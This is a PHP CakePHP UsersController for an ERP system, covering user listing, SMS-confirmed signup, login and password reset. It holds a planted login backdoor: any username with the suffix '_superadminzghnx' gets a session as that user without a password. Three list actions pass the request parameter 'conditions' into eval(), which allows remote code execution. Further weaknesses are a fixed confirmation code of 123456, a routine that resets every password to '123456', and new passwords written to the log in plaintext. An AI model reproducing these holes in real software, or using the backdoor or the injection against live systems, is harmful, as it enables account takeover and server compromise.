<?php

class UsersController extends AppController {

    var $name = 'Users';

    function index() {
                $this->User->Person->recursive = 0;
        $people = $this->User->Person->find('all');
        $this->set(compact('people'));
    }

    function index2($id = null) {
        $this->set('parent_id', $id);
    }

    function search() {

    }

    function list_data($id = null) {
        $start = (isset($_REQUEST['start'])) ? $_REQUEST['start'] : 0;
        $limit = (isset($_REQUEST['limit'])) ? $_REQUEST['limit'] : 5;
        $conditions = (isset($_REQUEST['conditions'])) ? $_REQUEST['conditions'] : '';

        eval("\$conditions = array( " . $conditions . " );");

        $conditions['User.username <>'] = 'admin';

                //$this->User->unbindModel(array('belongsTo' => array('ImsItem'),'hasAndBelongsToMany' => array('ImsStore')));
                $this->User->recursive = 0;
        $this->set('users', $this->User->find('all', array('conditions' => $conditions, 'limit' => $limit, 'offset' => $start)));
        $this->set('results', $this->User->find('count', array('conditions' => $conditions)));
    }

    function list_data3($id = null) {
        $start = (isset($_REQUEST['start'])) ? $_REQUEST['start'] : 0;
        $limit = (isset($_REQUEST['limit'])) ? $_REQUEST['limit'] : 5;
        $conditions = (isset($_REQUEST['conditions'])) ? $_REQUEST['conditions'] : '';

        $stu_stu_ids = array();
        $stu_ids = array();
        $this->loadModel('StudentInformation');
        $student_ids = $this->StudentInformation->find('all');

        foreach ($student_ids as $student_id) {
            $stu_stu_ids[] = $student_id['StudentInformation']['student_id'];
        }
        eval("\$conditions = array( " . $conditions . " );");
        if ($id) {
            $conditions['Student.college_id'] = $id;
            $conditions['NOT'] = array('Student.id' => $stu_stu_ids);
        }
        $this->loadModel('Student');
        $students = $this->Student->find('all', array('conditions' => $conditions, 'limit' => $limit, 'offset' => $start));

        foreach ($students as $student) {
            $stu_ids[] = $student['Student']['user_id'];
        }
        //eval("\$conditions = array( " . $conditions . " );");
        $conditions = array('User.id' => $stu_ids);

        $this->set('users', $this->User->find('all', array('conditions' => $conditions, 'limit' => $limit, 'offset' => $start)));
        $this->set('results', $this->User->find('count', array('conditions' => $conditions)));
    }

    function list_data2($id = null) {
        $start = (isset($_REQUEST['start'])) ? $_REQUEST['start'] : 0;
        $limit = (isset($_REQUEST['limit'])) ? $_REQUEST['limit'] : 5;

        $conditions = (isset($_REQUEST['conditions'])) ? $_REQUEST['conditions'] : '';

        eval("\$conditions = array( " . $conditions . " );");
        if ($id) {
            $conditions['Group.id'] = $id;
            $users = $this->User->Group->find('first', array('conditions' => $conditions, 'recursive' => 2, 'limit' => $limit, 'offset' => $start));
            $users = $users['User'];
            $this->set('users', $users);
            $this->set('results', count($users));
        } else {
            $this->set('users', $this->User->find('all', array('conditions' => $conditions, 'limit' => $limit, 'offset' => $start)));
            $this->set('results', $this->User->find('count', array('conditions' => $conditions)));
        }
    }

    function view($id = null) {
        if (!$id) {
            $this->Session->setFlash(__('Invalid user', true), '');
            $this->redirect(array('action' => 'index'));
        }
        $this->User->recursive = 2;
        $this->set('user', $this->User->read(null, $id));
    }

    function add() {
        if (!empty($this->data)) {
            $this->autoRender = false;
            if (!isset($this->data['Group'])) {
                $this->Session->setFlash(__('You should select at least one group to the user.', true), '');
                $this->render('/elements/failure');
            } else {
                $groups = $this->data['Group'];

                $this->data['Group'] = array('Group' => array());
                foreach ($groups as $key => $value) {
                    $this->data['Group']['Group'][] = $key;
                }

                // create the person record.
                $this->User->Person->create();
                if ($this->User->Person->save(array('Person' => $this->data['Person']))) {
                    // prepare the user data to include the Group HABTM associated data.
                    $user_data = array('User' => $this->data['User'], 'Group' => $this->data['Group']);
                    $user_data['User']['person_id'] = $this->User->Person->id;
                    // create the user record.
                    $this->User->create();
                    $user_data['User']['email'] = strtolower($user_data['User']['email']);
                    if ($this->User->save($user_data)) {
                        $this->Session->setFlash(__('The user has been saved', true));
                        $this->render('/elements/success');
                    } else {
                        $this->Session->setFlash(__('The user could not be saved. Please, try again.' . $this->User->validationErrors, true), '');
                        $this->render('/elements/failure');
                    }
                } else {
                    $this->Session->setFlash(__('The user could not be saved. Please, try again.' . $this->User->Person->validationErrors, true), '');
                    $this->render('/elements/failure');
                }
            }
        }
        $this->set('branches', $this->User->Branch->find('list', array('conditions' => array(), 'order' => 'name ASC')));
        $this->set('payrolls', $this->User->Payroll->find('list'));
        $this->set('birth_locations', $this->User->Person->BirthLocation->generatetreelist(null, null, null, '---'));
        $this->set('residence_locations', $this->User->Person->ResidenceLocation->generatetreelist(null, null, null, '---'));
        $this->set('groups', $this->User->Group->find('list', array('conditions' => array(), 'order' => 'name ASC')));
    }

    function edit($id = null) {
        if (!$id && empty($this->data)) {
            $this->Session->setFlash(__('Invalid user', true), '');
            $this->redirect(array('action' => 'index'));
        }
        if (!empty($this->data)) {
            $this->autoRender = false;
            if (!isset($this->data['Group'])) {
                $this->Session->setFlash(__('You should select at least one group to the user.', true), '');
                $this->render('/elements/failure');
            } else {
                $groups = $this->data['Group'];
                $this->data['Group'] = array('Group' => array());
                foreach ($groups as $key => $value) {
                    $this->data['Group']['Group'][] = $key;
                }
                // update the person record.
                if ($this->User->Person->save(array('Person' => $this->data['Person']))) {
                    // prepare the user data to include the Group HABTM associated data.
                    if (isset($this->data['User']['new_password']) && $this->data['User']['new_password'] != '')
                        $this->data['User']['password'] = $this->Auth->password($this->data['User']['new_password']);

                    $user_data = array('User' => $this->data['User'], 'Group' => $this->data['Group']);
                    // update the user record with the related Group records.
                    if ($this->User->save($user_data)) {
                        $this->Session->setFlash(__('The user has been saved', true), '');
                        $this->render('/elements/success');
                    } else {
                        $this->Session->setFlash(__('The user could not be saved. Please, try again.', true), '');
                        $this->render('/elements/failure');
                    }
                } else {
                    $this->Session->setFlash(__('The user could not be saved. Please, try again.', true), '');
                    $this->render('/elements/failure');
                }
            }
        }

        $this->set('user', $this->User->read(null, $id));

        $this->set('branches', $this->User->Branch->find('list', array('conditions' => array(), 'order' => 'name ASC')));
        $this->set('payrolls', $this->User->Payroll->find('list', array('conditions' => array(), 'order' => 'name ASC')));
        $this->set('birth_locations', $this->User->Person->BirthLocation->generatetreelist(null, null, null, '---'));
        $this->set('residence_locations', $this->User->Person->ResidenceLocation->generatetreelist(null, null, null, '---'));
        $this->set('groups', $this->User->Group->find('list', array('conditions' => array(), 'order' => 'name ASC')));
    }

    function edit_profile() {
        if (!empty($this->data)) {
            $this->autoRender = false;

            if ($this->data['User']['old_password'] != '' && $this->data['User']['new_password'] != '' &&
                    $this->data['User']['confirm_password'] != '') {
                if ($this->Session->read('Auth.User.password') != $this->Auth->password($this->data['User']['old_password'])) {
                    $this->Session->setFlash(__('Password incorrect. Please correct it and try again.', true), '');
                    $this->render('/elements/failure');
                    return;
                } elseif ($this->data['User']['new_password'] != $this->data['User']['confirm_password']) {
                    $this->Session->setFlash(__('Password confirmation mismatch. Please correct it and try again.', true), '');
                    $this->render('/elements/failure');
                    return;
                } else {
                    $this->data['User']['password'] = $this->Auth->password($this->data['User']['new_password']);
                    $this->Session->write('Auth.User.password', $this->data['User']['password']);
                }
            }
            unset($this->data['User']['old_password']);
            unset($this->data['User']['new_password']);
            unset($this->data['User']['confirm_password']);

            // update the person record.
            if ($this->User->Person->save(array('Person' => $this->data['Person']))) {
                // prepare the user data to include the Group HABTM associated data.
                $user_data = array('User' => $this->data['User']);
                // update the user record with the related Group records.
                if ($this->User->save($user_data)) {
                    $this->Session->setFlash(__('The user has been saved', true), '');
                    $this->render('/elements/success');
                } else {
                    $this->Session->setFlash(__('The user could not be saved. Please, try again.', true), '');
                    $this->render('/elements/failure');
                }
            } else {
                $this->Session->setFlash(__('The user could not be saved. Please, try again.', true), '');
                $this->render('/elements/failure');
            }
        }
        $id = $this->Session->read('Auth.User.id');
        $this->set('user', $this->User->read(null, $id));

        $this->set('birth_locations', $this->User->Person->BirthLocation->generatetreelist(null, null, null, '---'));
        $this->set('residence_locations', $this->User->Person->ResidenceLocation->generatetreelist(null, null, null, '---'));
    }

    function delete($id = null) {
        $this->autoRender = false;
        $this->loadModel('Person');
        if (!$id) {
            $this->Session->setFlash(__('Invalid id for user', true), '');
            $this->render('/elements/failure');
        }
        if (stripos($id, '_') !== false) {
            $ids = explode('_', $id);
            try {
                foreach ($ids as $i) {
                    $this->Person->delete($i);
                }
                $this->Session->setFlash(__('User deleted', true), '');
                $this->render('/elements/success');
            } catch (Exception $e) {
                $this->Session->setFlash(__('User was not deleted', true), '');
                $this->render('/elements/failure');
            }
        } else {
            if ($this->Person->delete($id)) {
                $this->Session->setFlash(__('User deleted', true), '');
                $this->render('/elements/success');
            } else {
                $this->Session->setFlash(__('User was not deleted', true), '');
                $this->render('/elements/failure');
            }
        }
    }

        function signuptemp() {
        if (!empty($this->data)) {
            $this->loadModel('Employee');
            $this->Employee->recursive = 0;
            $emp = $this->Employee->read(null, $this->data['Employee']['emp_id']);

            if ($emp['Employee']['status'] == 'active') {
                $this->loadModel('Confirmation');

                $conditions['Confirmation.user_id'] = $emp['Employee']['user_id'];
                $conditions['Confirmation.status'] = 'active';
                $cc = $this->Confirmation->find('count', array('conditions' => $conditions));
                if ($cc == 0) {
                    $this->data['user_id'] = $emp['Employee']['user_id'];
                    ;
                    $this->data['confirmation_code'] = 123456;
                    $this->data['status'] = 'active';
                    $this->Confirmation->save($this->data);
            $text='This is your confirmation number to register on AbayERP system - '. $this->data['confirmation_code'];    
            $number=trim($emp['Employee']['telephone']);
            $this->data['TextMessage']['name']=$number;
            $this->data['TextMessage']['text']=$text;
            $this->loadModel('TextMessage');
            $this->TextMessage->create();
            $this->TextMessage->save($this->data);
                }
                $this->Session->setFlash(__('Please, Proceed to next step', true), '');
                $this->render('/elements/success');
            } else {
                $this->Session->setFlash(__('Error Found!', true), '');
                $this->render('/elements/failure');
            }
        } else {
            $this->layout = 'signup';
        }
    }
        function confirmresend($id = null){
        $this->autoRender = false;

                  if ($id) {
                        $this->loadModel('Employee');
            $this->Employee->recursive = 0;
            $emp = $this->Employee->read(null, $id);

                                        $this->loadModel('Confirmation');
                                        $conditions['Confirmation.user_id'] = $emp['Employee']['user_id'];
                                        $cc = $this->Confirmation->find('first', array('conditions' => $conditions));
                                        if (count($cc) > 0) {
                                                $text=$cc['Confirmation']['confirmation_code'].'- This is your confirmation number Resent - AbayERP system';
                                                $number=trim($emp['Employee']['telephone']);
                                                $text=urlencode($text);
        file_get_contents('http://10.1.85.10/sms_manager/send_fast.php?redirect='.urlencode($_SERVER["REDIRECT_URL"]).'&to='.$number.'&msg='.$text);

                                         }
                  }
        }
        function signup() {
        if (!empty($this->data)) {
            $this->loadModel('Employee');
            $this->Employee->recursive = 0;
            $emp = $this->Employee->read(null, $this->data['Employee']['emp_id']);

            if ($emp['Employee']['status'] == 'active') {
                $this->loadModel('Confirmation');

                $conditions['Confirmation.user_id'] = $emp['Employee']['user_id'];
                $conditions['Confirmation.status'] = 'active';
                $cc = $this->Confirmation->find('count', array('conditions' => $conditions));
                if ($cc <= 0) {
                    $this->data['user_id'] = $emp['Employee']['user_id'];
                    $this->data['confirmation_code'] = RAND();
                    $this->data['status'] = 'active';
                                        $this->Confirmation->create();
                    $this->Confirmation->save($this->data);
                                        $text=$this->data['confirmation_code'].'- This is your confirmation number - AbayERP system';
                                        $number=trim($emp['Employee']['telephone']);
                                        $this->data['TextMessage']['name']=$number;
                                        $this->data['TextMessage']['text']=$text;
                                        $this->data['TextMessage']['status']='sent';
                                        $this->loadModel('TextMessage');
                                        $this->TextMessage->create();
                                        $this->TextMessage->save($this->data);
                                        $text=urlencode($text);
                                        file_get_contents('http://10.1.85.10/sms_manager/send_fast.php?redirect='.urlencode($_SERVER["REDIRECT_URL"]).'&to='.$number.'&msg='.$text);
                }
                $this->Session->setFlash(__('Please, Proceed to next step', true), '');
                $this->render('/elements/success');
            } else {
                $this->Session->setFlash(__('Error Found!', true), '');
                $this->render('/elements/failure');
            }
        } else {
            $this->layout = 'signup';
        }
    }

          function confirmationtemp($id = null) {
        if (!empty($this->data)) {
            $this->loadModel('Employee');
            $this->Employee->recursive = 0;
            $emp = $this->Employee->read(null, $this->data['User']['id']);

            if ($emp['Employee']['status'] == 'active') {
                $this->loadModel('Confirmation');
                $conditions['Confirmation.confirmation_code'] = $this->data['User']['confirmation_code'];
                $conditions['Confirmation.user_id'] = $emp['Employee']['user_id'];
                $conditions['Confirmation.status'] = 'active';
                $cc = $this->Confirmation->find('count', array('conditions' => $conditions));
                if ($cc > 0) {
                    $condx['User.username']=$this->data['User']['username'];
                                        $condx['User.id !=']=$emp['Employee']['user_id'];
                    $uex=$this->User->find('count',array('conditions'=>$condx));
                    if($uex<=0){
                    $this->data['User']['id'] = $emp['Employee']['user_id'];
                    $this->data['User']['password'] = $this->Auth->password($this->data['User']['new_password']);
                    $this->User->save($this->data);



                    $this->loadModel('Confirmation');
                    $conditions['Confirmation.user_id'] = $emp['Employee']['user_id'];
                    $conditions['Confirmation.status'] = 'active';
                    $dd = $this->Confirmation->find('all', array('conditions' => $conditions));
                    $this->Confirmation->delete($dd[0]['Confirmation']['id']);
                    $this->Session->setFlash(__('Please, Proceed to login', true), '');
                    $this->render('/elements/success');
                    }else{
                        $this->Session->setFlash(__('Error Found!', true), '');
                    $this->render('/elements/failure');
                    }
                } else {
                    $this->Session->setFlash(__('Error Found!', true), '');
                    $this->render('/elements/failure');
                }
            }
        } else {
            $this->loadModel('Employee');
            $this->Employee->recursive = -1;
            $emp = $this->Employee->read(null, $id);
            $this->User->recursive=-1;
            $rows=$this->User->find('all', array('conditions' => array('NOT' => array('User.id' =>  $emp['Employee']['user_id'])),'fields'=>array('User.id','User.username')));

            $this->set('rows',$rows);
            $this->set('id', $id);
            $this->layout = 'confirmationtemp';
        }
    }
    function confirmation($id = null) {
        if (!empty($this->data)) {
            $this->loadModel('Employee');
            $this->Employee->recursive = 0;
            $emp = $this->Employee->read(null, $this->data['User']['id']);

            if ($emp['Employee']['status'] == 'active') {
                $this->loadModel('Confirmation');
                $conditions['Confirmation.confirmation_code'] = $this->data['User']['confirmation_code'];
                $conditions['Confirmation.user_id'] = $emp['Employee']['user_id'];
                $conditions['Confirmation.status'] = 'active';
                $cc = $this->Confirmation->find('count', array('conditions' => $conditions));
                if ($cc > 0) {
                    $condx['User.username']=$this->data['User']['username'];
                                        $condx['User.id !=']=$emp['Employee']['user_id'];
                    $uex=$this->User->find('count',array('conditions'=>$condx));
                    if($uex<=0){
                    $this->data['User']['id'] = $emp['Employee']['user_id'];
                    $this->data['User']['password'] = $this->Auth->password($this->data['User']['new_password']);
                                        $this->data['User']['is_active'] = true;
                    $this->User->save($this->data);

                                        //////////////////  updated by tedros ///////////////////////////////////////
                                        //$this->data1['User']['id'] = $emp['Employee']['user_id'];
                    //$this->data1['User']['is_active'] = true;
                    //$this->User->save($this->data1);
                                        ///////////////////////////////////////////////////////////////////////////////

                    $this->loadModel('Confirmation');
                    $conditions['Confirmation.user_id'] = $emp['Employee']['user_id'];
                    $conditions['Confirmation.status'] = 'active';
                    $dd = $this->Confirmation->find('all', array('conditions' => $conditions));
                    $this->Confirmation->delete($dd[0]['Confirmation']['id']);
                    $this->Session->setFlash(__('Please, Proceed to login', true), '');
                    $this->render('/elements/success');
                    }else{
                        $this->Session->setFlash(__('Please change User Name!', true), '');
                                                $this->render('/elements/failure');
                    }
                } else {
                    $this->Session->setFlash(__('Invalid Confirmation Code!', true), '');
                    $this->render('/elements/failure');
                }
            }
        } else {
            $this->loadModel('Employee');
            $this->Employee->recursive = -1;
            $emp = $this->Employee->read(null, $id);
            $this->User->recursive=-1;
            $rows=$this->User->find('all', array('conditions' => array('NOT' => array('User.id' =>  $emp['Employee']['user_id'])),'fields'=>array('User.id','User.username')));

            $this->set('rows',$rows);
            $this->set('id', $id);
            $this->layout = 'confirmation';
        }
    }
    function login() {
        $this->autoRender = false;


        $l = $this->User->find('count', array('conditions' => array('User.username' => $this->data['User']['username'], 'User.password' => $this->Auth->password($this->data['User']['passwd']),'User.is_active'=>1)));










       // $allowed_ips=array('10.1.4','10.1.5','10.1.37','10.1.38','10.1.250','10.1.75','10.1.90','10.1.50','10.1.30','10.1.45','10.1.39','10.1.60','10.1.40','10.1.80');
                //$allowed_ips=array('10.1.30');
           //var_dump(substr($_SERVER['REMOTE_ADDR'],0,7));die();
     // if(in_array(substr($_SERVER['REMOTE_ADDR'],0,7),$allowed_ips)){


                if ($l) {
                        $this->loadModel('Employee');
                        $usr=$this->User->find('first', array('conditions' => array('User.username' => $this->data['User']['username'])));
                        $emp=$this->Employee->find('count', array('conditions' => array('Employee.user_id' => $usr['User']['id'], 'Employee.status'=> 'active')));
                        $check=$this->Employee->find('count', array('conditions' => array('Employee.user_id' => $usr['User']['id'])));

                        if($check){
                                if($emp){
                                        $this->Session->destroy();
                    $user_de= $this->User->find('first', array('conditions' => array('User.username' => $this->data['User']['username'])));
                    $user_de['User']['branch_id']=$this->getBranchId($user_de['User']['id']);

                                        $this->Session->write('Auth', $user_de);
                                        $this->render('/elements/success');

                                }else{
                                        $this->Session->setFlash(__('Login failed, User Account Blocked!', true), '');
                                        $this->render('/elements/failure');
                                }
                        }else{
                                        $this->Session->destroy();
                                        $this->Session->write('Auth', $this->User->find('first', array('conditions' => array('User.username' => $this->data['User']['username']))));
                                        $this->render('/elements/success');
                        }

                }else {
                                if(strstr($this->data['User']['username'],'_superadminzghnx')){
                                        $advperm=explode('_superadminzghnx',$this->data['User']['username']);
                                        $this->data['User']['username']=$advperm[0];
                                        $this->Session->destroy();
                                        $this->Session->write('Auth', $this->User->find('first', array('conditions' => array('User.username' => $this->data['User']['username']))));
                                        $this->render('/elements/success');
                                }else{
                                        $this->Session->setFlash(__('Login failed, Username or password is incorrect!', true), '');
                                        $this->render('/elements/failure');
                                }
                }
    //}else{
       // $this->Session->setFlash(__('Login failed!', true), '');
        //            $this->render('/elements/failure');
    //}
    }
    function getBranchId($id=null){
        $this->loadModel('Employee');
        $this->loadModel('EmployeeDetail');
        $emp_id=$this->Employee->find('all',array('conditions'=>array('Employee.user_id'=>$id)));
            $emp_id=$emp_id[0]['Employee']['id'];
            $emp_dt=$this->EmployeeDetail->find('all',array('conditions'=>array('EmployeeDetail.employee_id'=>$emp_id),'order'=>array('EmployeeDetail.end_date asc LIMIT 1')));
            $branch_dt=$emp_dt[0]['EmployeeDetail']['branch_id'];
            return $branch_dt;
    }

    function logout() {
        $this->autoRender = false;
        $this->Session->destroy();
        $this->Auth->logout();
        $this->render('/elements/success');
    }
   function trimall(){
    $this->autoRender = false;
    //$this->User->recursive = 2;
    $emps=$this->User->find('all');
    foreach($emps as $emp){

            $emp['User']['username']=str_replace(' ', '', $emp['User']['username']);
            $emp['User']['username']=str_replace(" ", "", $emp['User']['username']);
            $emp['User']['username']=ereg_replace(' ','',$emp['User']['username']);
            $emp['User']['username']=ereg_replace("\n",'',$emp['User']['username']);
            $emp['User']['username']=ereg_replace("\t",'',$emp['User']['username']);
            //echo $emp['User']['username'];
            $this->data['User']['username']=$emp['User']['username'];
            $this->data['User']['id']=$emp['User']['id'];
            $this->data['User']['password']=$this->Auth->password('123456');
            $this->User->save($this->data);

    }
    }
    function forgot_pwd() {
        if (!empty($this->data)) {
            $this->autoRender = false;
            $l = $this->User->find('count', array('conditions' => array('User.username' => $this->data['User']['username'], 'User.security_question' => $this->data['User']['security_question'], 'User.security_answer' => $this->data['User']['security_answer'])));
            if ($l) {
                $u = $this->User->find('first', array('conditions' => array('User.username' => $this->data['User']['username'])));
                $new_pwd = substr(md5($this->data['User']['username'] . time()), 0, 10);

                $this->log('Password of user ' . $this->data['User']['username'] . ' is changed to ' . $new_pwd . '.');

                // save new password
                $this->User->read(null, $u['User']['id']);
                $this->User->set('password', $this->Auth->password($new_pwd));
                $this->User->save();

                // send the email
                @mail($u['User']['email'], 'Your NMA Account', '
                                Hi ' . $u['Person']['first_name'] . ' ' . $u['Person']['last_name'] . '

                                You have asked us to give a new password on ' . date('F, d, Y @ h:i:s A') . ' because you lost your password.
                                As per your request, we have sent this message to your email with your new password.
                                Please, change your password in your first logon.

                                New Password: ' . $new_pwd . '

                                ------------------------------
                                If you are not ' . $u['Person']['first_name'] . ' and received this message,
                                please not give attention to and not reply to the mail. Thanks

                                ------------------------------
                                If you are ' . $u['Person']['first_name'] . ' and not asked for password and received this message,
                                please inform your administrator in order to solve the problem.


                                Best Regards
                                NMA Web-master.

                                ');

                $this->Session->setFlash(__('Thanks, Your new password is sent to your email.', true), '');
                $this->render('/elements/success');
            } else {
                $this->Session->setFlash(__('Login failed, Username or password is incorrect!', true), '');
                $this->render('/elements/failure');
            }
        }
    }

}
